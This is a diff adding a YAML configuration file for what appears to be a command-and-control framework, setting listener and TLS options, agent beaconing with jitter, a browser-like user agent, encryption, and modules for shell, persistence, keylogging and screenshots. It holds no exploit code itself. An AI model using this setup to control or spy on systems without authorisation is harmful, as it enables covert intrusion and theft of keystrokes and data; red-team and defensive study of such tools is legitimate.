@@ -1,0 +1,33 @@
+c2:
+  host: "0.0.0.0"
+  port: 8443
+  tls_cert: "certs/server.pem"
+  tls_key: "certs/server.key"
+  heartbeat_timeout: 120
+  max_agents: 1000
+
+agent:
+  beacon_interval: 30
+  jitter: 0.3
+  max_retries: 3
+  reconnect_delay: 60
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+crypto:
+  algorithm: "AES-256-GCM"
+  key_rotation_interval: 3600
+  curve: "X25519"
+
+logging:
+  level: "info"
+  format: "json"
+  output: "stdout"
+
+modules:
+  - "shell"
+  - "file"
+  - "process"
+  - "network"
+  - "persistence"
+  - "keylogger"
+  - "screenshot"
